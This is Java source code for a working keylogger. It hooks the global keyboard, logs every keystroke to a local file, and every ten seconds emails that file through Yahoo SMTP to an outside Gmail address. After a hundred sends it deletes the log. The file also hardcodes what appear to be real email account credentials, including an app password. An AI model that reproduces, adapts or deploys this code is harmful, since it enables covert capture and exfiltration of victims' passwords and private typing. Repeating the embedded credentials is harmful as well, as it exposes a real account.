package KeyLogs;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;




public class KeyLogger implements NativeKeyListener {
	final Path file=Paths.get("E:/keys.txt");


	public static void main(String[] args)  {
		

		Timer timer=new Timer();
		TimerTask task = new TimerTask() {
			int counter=100;
			
			@Override
			public void run() {
				if(counter>0) {
					
					System.out.println("Timer Started   Counter  "+counter);

						try {
							SendEmail();
							
							counter--;

						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}		}
				else
				{
					System.out.println("Timer Stopped");
					timer.cancel();
					File f= new File("E:/keys.txt");           //file to be delete  
					if(f.delete())                      //returns Boolean value  
					{  
					System.out.println(f.getName() + " deleted");   //getting and printing the file name  
					}  
					else  
					{  
					System.out.println("failed");  
					}  
					
					System.out.println("Message Sent");
					System.exit(0);
				}
		}};
			
		
		
		try {
			GlobalScreen.registerNativeHook();
		}
		catch(NativeHookException e) {
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
		
		
		timer.scheduleAtFixedRate(task,0,10000);

	}


	public void nativeKeyPressed(NativeKeyEvent e) {
		
		String keyText=NativeKeyEvent.getKeyText(e.getKeyCode());
	
		try(OutputStream os=Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer=new PrintWriter(os)){
			
			if(keyText.length()>1) {
				writer.print("\n ["+keyText+"] ");
			}else {
				writer.print(keyText);
			}
			
		}catch(IOException ex) {
			System.exit(-1);
		}
		

		
	}


	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}


	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	public static void SendEmail() throws IOException {

		//authentication info
				final String username="deepaksntiwari@yahoo.com";
				final String password="qbqzqshynjgjcccz";
				String fromEmail="deepaksntiwari@yahoo.com";
				String toEmail="dkt151999@gmail.com";
				
				
				Properties properties = new Properties();
				properties.put("mail.smtp.auth", "true");
				properties.put("mail.smtp.starttls.enable","true");
				properties.put("mail.smtp.host", "smtp.mail.yahoo.com");
				properties.put("mail.smtp.port", "587");
				
				Session session=Session.getInstance(properties, new javax.mail.Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(username, password);
					}
				});
				
				
				//Start our mail message 
				
				MimeMessage msg = new MimeMessage(session);
				try {
					msg.setFrom(new InternetAddress(fromEmail));
					msg.addRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));
					msg.setSubject("KeyStrokes");
					msg.setText("KeyStrokes");
					
					
					Multipart emailContent=new MimeMultipart();
					
					MimeBodyPart Keylog=new MimeBodyPart();
					Keylog.attachFile("E:/keys.txt");
					
					//Attach Body Parts
					emailContent.addBodyPart(Keylog);
					
					msg.setContent(emailContent);
					
					
					
					
					Transport.send(msg);
				}
				catch(MessagingException e) {
					e.printStackTrace();
				}
				
				
			}
	}
	
